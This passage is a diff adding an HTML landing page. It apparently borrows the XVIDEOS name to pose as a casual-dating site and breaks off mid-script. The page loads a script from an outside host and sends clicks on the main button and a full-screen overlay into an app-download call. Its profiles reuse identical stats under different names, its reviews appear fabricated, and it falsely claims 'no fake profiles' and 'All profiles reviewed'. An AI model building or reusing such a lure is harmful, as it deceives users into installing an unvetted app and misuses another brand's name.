@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+
+   <script src="https://api.xcty68.vip/js/meetu-sdk.js"></script>
+
+  <script>function k2(e) {
+  MeetU.download(event);
+  }</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>XVIDEOS -Find Your Match Tonight</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --rose: #e11d48;
+      --rose-2: #fb7185;
+      --rose-soft: #fff1f2;
+      --ink: #1f2937;
+      --muted: #94a3b8;
+      --muted-2: #64748b;
+      --emerald: #10b981;
+      --amber: #f59e0b;
+      --violet: #8b5cf6;
+      --blue: #3b82f6;
+      --card: #ffffff;
+      --line: #f3e8ea;
+    }
+    body {
+      font-family: 'Nunito', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: linear-gradient(180deg, #fff7f8 0%, #fdf0f3 100%);
+      color: var(--ink);
+      -webkit-font-smoothing: antialiased;
+      overflow-x: hidden;
+      max-width: 480px;
+      margin: 0 auto;
+      min-height: 100vh;
+      padding-bottom: 110px;
+    }
+
+    /* ---- Top bar ---- */
+    .topbar {
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0.85rem 1.25rem;
+      background: rgba(255, 255, 255, 0.82);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--line);
+    }
+    .logo {
+      height: 32px;
+      width: auto;
+      display: block;
+      object-fit: contain;
+    }
+    .topbar-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.68rem;
+      font-weight: 800;
+      color: var(--emerald);
+      background: rgba(16, 185, 129, 0.1);
+      border: 1px solid rgba(16, 185, 129, 0.22);
+      padding: 4px 11px;
+      border-radius: 999px;
+    }
+    .dot {
+      width: 7px; height: 7px; border-radius: 50%;
+      background: var(--emerald);
+      animation: livePulse 1.6s infinite;
+    }
+    @keyframes livePulse {
+      0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(16,185,129,0.5); }
+      50% { opacity: 0.5; box-shadow: 0 0 0 5px rgba(16,185,129,0); }
+    }
+
+    /* ---- Hero ---- */
+    .hero { padding: 2rem 1.25rem 1rem; text-align: center; position: relative; }
+    .hero::before {
+      content: '';
+      position: absolute;
+      top: -40px; left: -40px;
+      width: 220px; height: 220px;
+      background: radial-gradient(circle, rgba(251,113,133,0.18) 0%, transparent 65%);
+      pointer-events: none;
+    }
+    .hero-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 5px 14px;
+      background: rgba(225, 29, 72, 0.08);
+      border: 1px solid rgba(225, 29, 72, 0.16);
+      color: var(--rose);
+      border-radius: 999px;
+      font-size: 0.68rem;
+      font-weight: 800;
+      letter-spacing: 0.02em;
+      margin-bottom: 0.9rem;
+      position: relative; z-index: 1;
+    }
+    .hero-badge .dot { background: var(--rose); animation-name: rosePulse; }
+    @keyframes rosePulse {
+      0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(225,29,72,0.5); }
+      50% { opacity: 0.5; box-shadow: 0 0 0 5px rgba(225,29,72,0); }
+    }
+    .hero h1 {
+      font-size: 2.1rem;
+      font-weight: 900;
+      line-height: 1.12;
+      letter-spacing: -0.03em;
+      margin-bottom: 0.6rem;
+      position: relative; z-index: 1;
+    }
+    .hero h1 .gt {
+      background: linear-gradient(120deg, var(--rose), #ec4899);
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .hero-sub {
+      font-size: 0.84rem;
+      color: var(--muted-2);
+      line-height: 1.55;
+      max-width: 300px;
+      margin: 0 auto 1rem;
+    }
+    .avatar-stack {
+      display: flex;
+      justify-content: center;
+      gap: 0.5rem;
+ margin-top: 20px;
+      margin-bottom: 1rem;
+    }
+    .avatar-stack img {
+      width: 44px; height: 44px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 2.5px solid #fff;
+      box-shadow: 0 2px 8px rgba(225,29,72,0.15);
+    }
+    .avatar-stack img:nth-child(odd) { transform: translateY(-6px); }
+    .avatar-stack img:nth-child(even) { transform: translateY(2px); }
+    .stats-row {
+      display: flex;
+      justify-content: center;
+      gap: 1.6rem;
+      margin-top: 0.75rem;
+    }
+    .stat-num { font-size: 1.15rem; font-weight: 900; color: var(--rose); }
+    .stat-label { font-size: 0.62rem; color: var(--muted); }
+
+    /* ---- Sections ---- */
+    .sec { padding: 1.4rem 1.25rem; }
+    .sec-head { text-align: center; margin-bottom: 1rem; }
+    .sec-tag {
+      font-size: 0.62rem;
+      font-weight: 800;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--rose);
+      margin-bottom: 4px;
+    }
+    .sec-title { font-size: 1.3rem; font-weight: 800; letter-spacing: -0.02em; }
+    .sec-sub { font-size: 0.78rem; color: var(--muted); margin-top: 3px; }
+
+    /* ---- Hot picks carousel ---- */
+    .hot-scroll {
+      display: flex;
+      gap: 10px;
+      overflow-x: auto;
+      scroll-snap-type: x mandatory;
+      scrollbar-width: none;
+      -webkit-overflow-scrolling: touch;
+      padding: 4px 1.25rem 10px;
+      margin: 0 -1.25rem;
+      scroll-behavior: smooth;
+    }
+    .hot-scroll::-webkit-scrollbar { display: none; }
+    .hot-card {
+      flex: 0 0 138px;
+      scroll-snap-align: start;
+      background: var(--card);
+      border-radius: 18px;
+      overflow: hidden;
+      box-shadow: 0 6px 20px rgba(225, 29, 72, 0.08);
+      border: 1px solid var(--line);
+      cursor: pointer;
+      transition: transform 0.15s;
+    }
+    .hot-card:active { transform: scale(0.96); }
+    .hot-img { position: relative; aspect-ratio: 3/4; overflow: hidden; }
+    .hot-img img { width: 100%; height: 100%; object-fit: cover; display: block; }
+    .hot-badge {
+      position: absolute;
+      top: 8px; left: 8px;
+      padding: 3px 9px;
+      border-radius: 10px;
+      font-size: 0.55rem;
+      font-weight: 800;
+      letter-spacing: 0.03em;
+      text-transform: uppercase;
+      color: #fff;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+    }
+    .hot-badge.popular { background: linear-gradient(135deg, #f97316, #fb923c); }
+    .hot-badge.new { background: linear-gradient(135deg, #3b82f6, #60a5fa); }
+    .hot-badge.verified { background: linear-gradient(135deg, #10b981, #34d399); }
+    .hot-badge.vip { background: linear-gradient(135deg, #8b5cf6, #a78bfa); }
+    .hot-views {
+      position: absolute;
+      bottom: 8px; right: 8px;
+      font-size: 0.58rem;
+      font-weight: 700;
+      color: #fff;
+      background: rgba(31, 41, 55, 0.45);
+      padding: 2px 8px;
+      border-radius: 9px;
+      backdrop-filter: blur(4px);
+    }
+    .hot-info { padding: 9px 10px; }
+    .hot-name { font-size: 0.8rem; font-weight: 800; color: var(--ink); }
+    .hot-age { font-weight: 700; color: var(--muted); font-size: 0.72rem; }
+    .hot-dots { display: flex; justify-content: center; gap: 5px; margin-top: 10px; }
+    .hot-dot {
+      width: 5px; height: 5px; border-radius: 3px;
+      background: rgba(225, 29, 72, 0.18);
+      transition: all 0.3s;
+    }
+    .hot-dot.on { background: var(--rose); width: 16px; }
+
+    /* ---- Main list: 2-column masonry grid ---- */
+    .user-list { display: flex; gap: 12px; align-items: flex-start; }
+    .p-col { flex: 1; display: flex; flex-direction: column; gap: 12px; }
+    .p-card {
+      position: relative;
+      border-radius: 20px;
+      overflow: hidden;
+      background: var(--card);
+      border: 1px solid var(--line);
+      box-shadow: 0 6px 20px rgba(225, 29, 72, 0.08);
+      cursor: pointer;
+      transition: transform 0.15s;
+    }
+    .p-card:active { transform: scale(0.97); }
+    .p-card img { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; display: block; }
+    .p-shade {
+      position: absolute; inset: 0;
+      background: linear-gradient(180deg, rgba(0,0,0,0.18) 0%, rgba(0,0,0,0) 32%, rgba(0,0,0,0) 55%, rgba(0,0,0,0.85) 100%);
+    }
+    .p-badge {
+      position: absolute; top: 10px; left: 10px;
+      padding: 3px 9px; border-radius: 10px;
+      font-size: 0.55rem; font-weight: 800; letter-spacing: 0.03em; text-transform: uppercase; color: #fff;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+    }
+    .p-badge.online { background: linear-gradient(135deg, #10b981, #34d399); }
+    .p-badge.hot { background: linear-gradient(135deg, #f97316, #fb923c); }
+    .p-badge.new { background: linear-gradient(135deg, #8b5cf6, #a78bfa); }
+    .p-play {
+      position: absolute; top: 12px; right: 12px;
+      width: 40px; height: 40px; border-radius: 50%;
+      border: none; cursor: pointer;
+      background: linear-gradient(135deg, var(--rose), #ec4899);
+      color: #fff;
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 4px 16px rgba(225, 29, 72, 0.55);
+      z-index: 2;
+      transition: transform 0.12s;
+    }
+    .p-play svg { margin-left: 2px; }
+    .p-play::before, .p-play::after {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      border-radius: 50%;
+      border: 2px solid rgba(255, 255, 255, 0.95);
+      animation: playPing 1.8s cubic-bezier(0, 0, 0.2, 1) infinite;
+    }
+    .p-play::after { animation-delay: 0.9s; }
+    @keyframes playPing {
+      0% { transform: scale(1); opacity: 1; }
+      100% { transform: scale(1.6); opacity: 0; }
+    }
+    .p-play:active { transform: scale(0.88); }
+    .p-info { position: absolute; left: 0; right: 0; bottom: 0; padding: 12px; }
+    .p-name { color: #fff; font-size: 0.95rem; font-weight: 900; display: flex; align-items: center; gap: 5px; }
+    .p-name .v {
+      width: 15px; height: 15px; background: var(--rose); color: #fff; border-radius: 50%;
+      display: inline-flex; align-items: center; justify-content: center; font-size: 0.55rem;
+    }
+    .p-age { font-weight: 700; color: rgba(255, 255, 255, 0.85); font-size: 0.8rem; }
+    .p-job { font-size: 0.72rem; color: rgba(255, 255, 255, 0.85); margin-top: 1px; }
+    .p-loc { font-size: 0.66rem; color: rgba(255, 255, 255, 0.72); margin-top: 2px; }
+
+    /* ---- Safety ---- */
+    .safety-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
+    .safety-item {
+      text-align: center;
+      padding: 1rem 0.4rem;
+      background: var(--card);
+      border: 1px solid var(--line);
+      border-radius: 16px;
+      box-shadow: 0 4px 14px rgba(225,29,72,0.05);
+    }
+    .safety-item .ic {
+      width: 42px; height: 42px;
+      margin: 0 auto 6px;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .safety-item .t { font-size: 0.78rem; font-weight: 800; }
+    .safety-item .d { font-size: 0.6rem; color: var(--muted); line-height: 1.25; margin-top: 2px; }
+
+    /* ---- Reviews ---- */
+    .review-scroll {
+      display: flex;
+      gap: 12px;
+      overflow-x: auto;
+      scroll-snap-type: x mandatory;
+      scrollbar-width: none;
+      -webkit-overflow-scrolling: touch;
+      padding: 4px 0 8px;
+    }
+    .review-scroll::-webkit-scrollbar { display: none; }
+    .review-card {
+      min-width: 250px;
+      max-width: 290px;
+      flex-shrink: 0;
+      scroll-snap-align: start;
+      background: var(--card);
+      border: 1px solid var(--line);
+      border-radius: 18px;
+      padding: 1rem;
+      box-shadow: 0 4px 14px rgba(225,29,72,0.06);
+    }
+    .review-stars { color: #f59e0b; letter-spacing: 1px; margin-bottom: 0.5rem; }
+    .review-text { font-size: 0.76rem; color: var(--muted-2); line-height: 1.55; margin-bottom: 0.7rem; }
+    .review-author { display: flex; align-items: center; gap: 9px; }
+    .review-author img { width: 34px; height: 34px; border-radius: 50%; object-fit: cover; }
+    .review-author-name { font-size: 0.76rem; font-weight: 800; }
+    .review-author-role { font-size: 0.62rem; color: var(--muted); }
+
+    /* ---- Viewer ---- */
+    .viewer {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 999;
+      background: rgba(255, 247, 248, 0.97);
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+    }
+    .viewer.on { display: flex; }
+    .viewer-close {
+      position: absolute;
+      top: 16px; right: 16px;
+      z-index: 10;
+      width: 40px; height: 40px;
+      border-radius: 50%;
+      background: rgba(225, 29, 72, 0.1);
+      color: var(--rose);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.5rem;
+      line-height: 1;
+      cursor: pointer;
+      border: none;
+      font-weight: 700;
+    }
+    .viewer-frame {
+      width: 100%;
+      max-width: 340px;
+      aspect-ratio: 3/4;
+      border-radius: 22px;
+      overflow: hidden;
+      box-shadow: 0 20px 50px rgba(225, 29, 72, 0.18);
+    }
+    .viewer-frame img { width: 100%; height: 100%; object-fit: cover; display: block; }
+    .viewer-info { text-align: center; margin-top: 18px; }
+    .viewer-info .v-name { font-size: 1.15rem; font-weight: 900; }
+    .viewer-info .v-job { font-size: 0.85rem; color: var(--muted-2); margin-top: 2px; }
+    .viewer-info .v-stats { font-size: 0.78rem; color: var(--muted); margin-top: 4px; }
+    .viewer-info .v-loc { font-size: 0.72rem; color: var(--rose); font-weight: 700; margin-top: 2px; }
+
+    /* ---- Floating CTA ---- */
+    .float-cta {
+      position: fixed;
+      bottom: 0; left: 50%;
+      transform: translateX(-50%);
+      width: 100%;
+      max-width: 480px;
+      z-index: 200;
+      padding: 0.7rem 1rem 1rem;
+      background: linear-gradient(0deg, rgba(255,247,248,0.98) 60%, rgba(255,247,248,0) 100%);
+      pointer-events: none;
+    }
+    .float-cta-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      width: 100%;
+      padding: 0.9rem;
+      border-radius: 999px;
+      font-size: 0.98rem;
+      font-weight: 800;
+      text-decoration: none;
+      cursor: pointer;
+      border: none;
+      background: linear-gradient(135deg, var(--rose), #ec4899);
+      color: #fff;
+      pointer-events: auto;
+      position: relative;
+      overflow: hidden;
+      animation: breathe 1.8s ease-in-out infinite;
+      box-shadow: 0 8px 24px rgba(225, 29, 72, 0.35);
+    }
+    @keyframes breathe {
+      0%, 100% { box-shadow: 0 8px 24px rgba(225,29,72,0.35); transform: scale(1); }
+      50% { box-shadow: 0 10px 34px rgba(225,29,72,0.5); transform: scale(1.02); }
+    }
+    .float-cta-btn:active { transform: scale(0.97); animation: none; }
+    .float-cta-btn::before {
+      content: '';
+      position: absolute;
+      top: 0; left: -80%;
+      width: 50%; height: 100%;
+      background: linear-gradient(105deg, transparent, rgba(255,255,255,0.55), transparent);
+      transform: skewX(-20deg);
+      animation: shine 2.6s ease-in-out infinite;
+    }
+    @keyframes shine {
+      0% { left: -80%; }
+      55%, 100% { left: 130%; }
+    }
+    .cta-free {
+      background: #fff;
+      color: var(--rose);
+      font-size: 0.62rem;
+      font-weight: 900;
+      letter-spacing: 0.05em;
+      padding: 2px 8px;
+      border-radius: 999px;
+    }
+
+    .ft { text-align: center; padding: 0.9rem; font-size: 0.6rem; color: var(--muted); }
+
+    /* ---- Video player (first screen) ---- */
+    .video-player {
+      margin: 1.2rem 0 0;
+      aspect-ratio: 16 / 9;
+      background: #000;
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: 0 12px 34px rgba(225, 29, 72, 0.16);
+      border: 1px solid var(--line);
+    }
+    .video-player video { width: 100%; height: 100%; object-fit: cover; display: block; }
+
+    /* ---- Download popup ---- */
+    .dl-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 1000;
+      background: rgba(31, 41, 55, 0.55);
+      backdrop-filter: blur(4px);
+      -webkit-backdrop-filter: blur(4px);
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+    }
+    .dl-overlay.on { display: flex; }
+    .dl-card {
+      width: 100%;
+      max-width: 360px;
+      background: var(--card);
+      border-radius: 24px;
+      padding: 2rem 1.5rem 1.7rem;
+      text-align: center;
+      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.3);
+      cursor: pointer;
+      animation: popIn 0.25s ease-out;
+      position: relative;
+    }
+    .dl-close {
+      position: absolute;
+      top: 12px; right: 12px;
+      width: 32px; height: 32px;
+      border-radius: 50%;
+      background: rgba(31, 41, 55, 0.08);
+      color: var(--muted-2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.3rem;
+      line-height: 1;
+      cursor: pointer;
+      border: none;
+      font-weight: 700;
+    }
+    @keyframes popIn {
+      from { transform: scale(0.9); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+    .dl-emoji { font-size: 2.6rem; line-height: 1; }
+    .dl-card h3 { font-size: 1.25rem; font-weight: 900; margin: 0.7rem 0 0.4rem; color: var(--ink); }
+    .dl-card p { font-size: 0.85rem; color: var(--muted-2); line-height: 1.5; }
+    .dl-btn {
+      display: block;
+      width: 100%;
+      margin-top: 1.25rem;
+      padding: 0.85rem;
+      border-radius: 999px;
+      background: linear-gradient(135deg, var(--rose), #ec4899);
+      color: #fff;
+      font-weight: 800;
+      font-size: 0.95rem;
+      box-shadow: 0 8px 24px rgba(225, 29, 72, 0.35);
+    }
+    .dl-sub { font-size: 0.85rem; color: var(--muted-2); line-height: 1.5; margin-top: 0.4rem; }
+    .dl-list { margin: 1.1rem 0 0; text-align: left; }
+    .dl-item {
+      display: flex; align-items: center; gap: 9px;
+      font-size: 0.85rem; font-weight: 700; color: var(--ink);
+      padding: 6px 0;
+    }
+    .dl-chk {
+      flex-shrink: 0;
+      width: 20px; height: 20px; border-radius: 50%;
+      background: rgba(16, 185, 129, 0.14); color: var(--emerald);
+      display: inline-flex; align-items: center; justify-content: center;
+      font-size: 0.7rem; font-weight: 900;
+    }
+    .dl-note { font-size: 0.68rem; color: var(--muted); margin-top: 0.85rem; }
+  </style>
+</head>
+<body>
+
+  <!-- Top bar -->
+  <div class="topbar">
+    <img class="logo" src="images/s2.jpg" alt="logo">
+    <div class="topbar-pill"><span class="dot"></span>Online</div>
+  </div>
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="hero-badge"><span class="dot"></span>LIVE · Casual Dating</div>
+    <h1>Find Your<span class="gt"> Perfect Match</span></h1>
+    <p class="hero-sub"> Real-time online video – Real people are online right now, video chat instantly..</p>
+
+    <!-- Video player -->
+         <!-- Video player -->
+    <div class="video-player">
+      <video id="myVideo" controls autoplay muted playsinline webkit-playsinline style="width:100%; height:100%;">
+        <source src="video.webm" type="video/webm">
+      </video>
+    </div>
+
+    <div class="avatar-stack">
+      <img src="images/10-1.jpg" alt="">
+      <img src="images/9-1.jpg" alt="">
+      <img src="images/8-1.jpg" alt="">
+      <img src="images/7-1.jpg" alt="">
+      <img src="images/6-1.jpg" alt="">
+    </div>
+    <div class="stats-row">
+      <div><div class="stat-num">100%</div><div class="stat-label">Free to join</div></div>
+      <div><div class="stat-num">24/7</div><div class="stat-label">Real members</div></div>
+      <div><div class="stat-num">Instant</div><div class="stat-label">Matching</div></div>
+    </div>
+  </section>
+
+  <!-- Hot picks -->
+  <section class="sec" style="padding-top:0.6rem">
+    <div class="sec-head">
+      <div class="sec-tag">🔥 Most Viewed Right Now</div>
+      <h2 class="sec-title">Who's Available Tonight</h2>
+      <p class="sec-sub"><span style="color:var(--emerald);font-weight:700">People</span> browsing now</p>
+    </div>
+    <div class="hot-scroll" id="hotScroll"></div>
+    <div class="hot-dots" id="hotDots"></div>
+  </section>
+
+  <!-- Main list -->
+  <section class="sec">
+    <div class="sec-head">
+      <h2 class="sec-title">Meet Them Tonight</h2>
+      <p class="sec-sub">Browse their photos. They're ready to meet you.</p>
+    </div>
+    <div class="user-list" id="userList"></div>
+  </section>
+
+  <!-- Safety -->
+  <section class="sec" style="background:rgba(255,255,255,0.5)">
+    <h2 class="sec-title" style="text-align:center;margin-bottom:0.9rem">Safe &amp; Private</h2>
+    <div class="safety-grid">
+      <div class="safety-item">
+        <div class="ic" style="background:rgba(16,185,129,0.12)">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="1.8"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+        </div>
+        <div class="t">Privacy</div>
+        <div class="d">Your identity is protected</div>
+      </div>
+      <div class="safety-item">
+        <div class="ic" style="background:rgba(245,158,11,0.12)">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="1.8"><circle cx="12" cy="12" r="10"></circle><path d="M9 12l2 2 4-4"></path></svg>
+        </div>
+        <div class="t">Verified</div>
+        <div class="d">All profiles reviewed</div>
+      </div>
+      <div class="safety-item">
+        <div class="ic" style="background:rgba(59,130,246,0.12)">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" stroke-width="1.8"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+        </div>
+        <div class="t">Support</div>
+        <div class="d">Help when you need it</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Reviews -->
+  <section class="sec">
+    <div class="sec-head">
+      <h2 class="sec-title">What They Say</h2>
+      <p class="sec-sub">Real stories from people who found their match</p>
+    </div>
+    <div class="review-scroll" id="reviewScroll">
+      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"I met an amazing girl here last Friday. We chatted, met up for drinks that same night and the chemistry was instant. The best date in years!"</p><div class="review-author"><img src="images/c1.jpg" alt=""><div><div class="review-author-name">Emeka</div><div class="review-author-role">Verified member</div></div></div></div>
+      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"Everyone here is real and authentic. No fake profiles, no games. I met 3 wonderful women in 2 weeks. Every date was better than the last!"</p><div class="review-author"><img src="images/c2.jpg" alt=""><div><div class="review-author-name">Tunde</div><div class="review-author-role">Verified member</div></div></div></div>
+      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"I was skeptical, but I connected with Blessing and we clicked instantly. We had an amazing dinner. I'll see her again this weekend!"</p><div class="review-author"><img src="images/c3.jpg" alt=""><div><div class="review-author-name">David</div><div class="review-author-role">Verified member</div></div></div></div>
+      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"It's so easy to find someone you truly connect with. You see exactly who you're talking to. No wasted time, just real dates with real people."</p><div class="review-author"><img src="images/c4.jpg" alt=""><div><div class="review-author-name">Chuka</div><div class="review-author-role">Verified member</div></div></div></div>
+      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"I joined on Thursday, had a date on Friday night. We went for coffee and talked for hours. Easily the most natural connection I've ever had."</p><div class="review-author"><img src="images/c5.jpg" alt=""><div><div class="review-author-name">Femi</div><div class="review-author-role">Verified member</div></div></div></div>
+    </div>
+  </section>
+
+  <!-- Viewer -->
+  <div class="viewer" id="viewer">
+    <button class="viewer-close" onclick="closeViewer()" aria-label="Close">×</button>
+    <div class="viewer-frame"><img id="vImg" src="" alt=""></div>
+    <div class="viewer-info" id="vInfo"></div>
+  </div>
+
+  <!-- Floating CTA -->
+  <div class="float-cta">
+    <a href="javascript:void(0)" class="float-cta-btn" onclick="k2(event)">💘 Download now <span class="cta-free">Free</span></a>
+  </div>
+
+  <div class="ft">XVIDEOS · Connect with local singles</div>
+
+  <!-- Download popup -->
+  <div class="dl-overlay" id="dlOverlay" onclick="k2(event)">
+    <div class="dl-card">
+      <button class="dl-close" onclick="event.stopPropagation(); closeDownload()" aria-label="Close">×</button>
+      
+      <h3>Unlock Full Access</h3>
+      <p class="dl-sub">Download the app to watch everything free — every profile, photo and chat.</p>
+      <div class="dl-list">
+        <div class="dl-item"><span class="dl-chk">✓</span>100% free to join</div>
+        <div class="dl-item"><span class="dl-chk">✓</span>See every profile &amp; photo</div>
+        <div class="dl-item"><span class="dl-chk">✓</span>Chat with real local singles</div>
+      </div>
+      <span class="dl-btn">Get the App Free · Start Now</span>
+      <div class="dl-note">🔒 Secure &amp; private — no credit card required</div>
+    </div>
+  </div>
+
+  <script>
+    var USERS = [
+      {n:1, name:'Ada',      age:20, job:'Makeup artist',      h:'173cm', w:'116lbs', loc:'Lagos',          badge:'Online', bt:'online'},
+      {n:2, name:'Darlene',  age:22, job:'Student',        h:'176cm', w:'109lbs', loc:'Abuja',          badge:'Popular',  bt:'hot'},
+      {n:3, name:'Alma',     age:25, job:'Student',        h:'165cm', w:'112lbs', loc:'Port Harcourt',  badge:'New',    bt:'new'},
+      {n:4, name:'Bonnie',   age:26, job:'Fitness coach',h:'168cm', w:'116lbs', loc:'Kano',           badge:'Online', bt:'online'},
+      {n:5, name:'Dora',     age:24, job:'Doctor',           h:'165cm', w:'104lbs', loc:'Ibadan',         badge:'Popular',  bt:'hot'},
+      {n:6, name:'Camille',  age:24, job:'Doctor',           h:'165cm', w:'104lbs', loc:'Enugu',          badge:'Online', bt:'online'},
+      {n:7, name:'Cara',     age:26, job:'Photographer',         h:'168cm', w:'113lbs', loc:'Benin City',     badge:'New',    bt:'new'},
+      {n:8, name:'Debby',    age:21, job:'Student',        h:'168cm', w:'108lbs', loc:'Owerri',         badge:'Online', bt:'online'},
+      {n:9, name:'Fanny',    age:23, job:'Student',        h:'167cm', w:'115lbs', loc:'Kaduna',         badge:'Popular',  bt:'hot'},
+      {n:10,name:'Elaine',   age:25, job:'Student',        h:'170cm', w:'122lbs', loc:'Abeokuta',       badge:'Online', bt:'online'},
+      {n:11,name:'Gemma',    age:28, job:'Photographer',         h:'172cm', w:'125lbs', loc:'Onitsha',        badge:'New',    bt:'new'},
+      {n:12,name:'Hedy',     age:22, job:'Makeup artist',      h:'166cm', w:'108lbs', loc:'Warri',          badge:'Online', bt:'online'},
+      {n:1, name:'Hulda',    age:27, job:'Accountant',         h:'169cm', w:'120lbs', loc:'Calabar',        badge:'Popular',  bt:'hot'},
+      {n:2, name:'Jade',     age:24, job:'Student',        h:'164cm', w:'110lbs', loc:'Uyo',            badge:'Online', bt:'online'},
+      {n:3, name:'Joyce',    age:26, job:'Doctor',           h:'171cm', w:'118lbs', loc:'Jos',            badge:'New',    bt:'new'},
+      {n:4, name:'Kama',     age:25, job:'Pharmacist',      h:'168cm', w:'113lbs', loc:'Maiduguri',      badge:'Online', bt:'online'},
+      {n:5, name:'Laura',    age:28, job:'Fitness coach',h:'174cm', w:'126lbs', loc:'Sokoto',         badge:'Popular',  bt:'hot'},
+      {n:6, name:'Elsie',    age:27, job:'Student',        h:'167cm', w:'115lbs', loc:'Ilorin',         badge:'Online', bt:'online'},
+      {n:1, name:'Emma',     age:20, job:'Makeup artist',      h:'173cm', w:'116lbs', loc:'Lagos',          badge:'Online', bt:'online'},
+      {n:2, name:'Olivia',   age:22, job:'Student',        h:'176cm', w:'109lbs', loc:'Abuja',          badge:'Popular',  bt:'hot'},
+      {n:3, name:'Ava',      age:25, job:'Student',        h:'165cm', w:'112lbs', loc:'Port Harcourt',  badge:'New',    bt:'new'},
+      {n:4, name:'Sophia',   age:26, job:'Fitness coach',h:'168cm', w:'116lbs', loc:'Kano',           badge:'Online', bt:'online'},
+      {n:5, name:'Isabella', age:24, job:'Student',        h:'165cm', w:'104lbs', loc:'Ibadan',         badge:'Popular',  bt:'hot'},
+      {n:6, name:'Mia',      age:24, job:'Doctor',           h:'165cm', w:'104lbs', loc:'Enugu',          badge:'Online', bt:'online'},
+      {n:7, name:'Charlotte',age:26, job:'Photographer',         h:'168cm', w:'113lbs', loc:'Benin City',     badge:'New',    bt:'new'},
+      {n:8, name:'Amelia',   age:21, job:'Student',        h:'168cm', w:'108lbs', loc:'Owerri',         badge:'Online', bt:'online'},
+      {n:9, name:'Harper',   age:23, job:'Student',        h:'167cm', w:'115lbs', loc:'Kaduna',         badge:'Popular',  bt:'hot'},
+      {n:10,name:'Evelyn',   age:25, job:'Student',        h:'170cm', w:'122lbs', loc:'Abeokuta',       badge:'Online', bt:'online'},
+      {n:11,name:'Abigail',  age:28, job:'Photographer',         h:'172cm', w:'125lbs', loc:'Onitsha',        badge:'New',    bt:'new'},
+      {n:12,name:'Lily',     age:22, job:'Makeup artist',      h:'166cm', w:'108lbs', loc:'Warri',          badge:'Online', bt:'online'}
+    ];
+
+    var HOT = [
+      {n:1, name:'Ada',     age:20, badge:'Popular',       bt:'popular',  views:'12.4K'},
+      {n:2, name:'Darlene', age:22, badge:'New',bt:'new',      views:'8.2K'},
+      {n:3, name:'Alma',    age:25, badge:'Verified',    bt:'verified', views:'15.7K'},
+      {n:4, name:'Bonnie',  age:26, badge:'Popular',       bt:'popular',  views:'20.1K'},
+      {n:5, name:'Dora',    age:24, badge:'New',bt:'new',      views:'9.8K'},
+      {n:6, name:'Camille', age:24, badge:'VIP',           bt:'vip',      views:'18.3K'}
+    ];
+
+    // Render hot picks
+    var hotHtml = '', dotHtml = '';
+    HOT.forEach(function(h, i) {
+      hotHtml += '<div class="hot-card" onclick="openViewer(\'' + h.name + '\',\'' + h.age + '\',\'\',\'\',\'\',\'\',\'images/' + h.n + '-1.jpg\')">'
+        + '<div class="hot-img"><img src="images/' + h.n + '-1.jpg" alt="">'
+        + '<span class="hot-badge ' + h.bt + '">' + h.badge + '</span>'
+        + '<span class="hot-views">👁 ' + h.views + '</span></div>'
+        + '<div class="hot-info"><div class="hot-name">' + h.name + ' <span class="hot-age">' + h.age + '</span></div></div></div>';
+      dotHtml += '<span class="hot-dot' + (i === 0 ? ' on' : '') + '"></span>';
+    });
+    document.getElementById('hotScroll').innerHTML = hotHtml;
+    document.getElementById('hotDots').innerHTML = dotHtml;
+
+    // Render user list (2-column masonry, first 15)
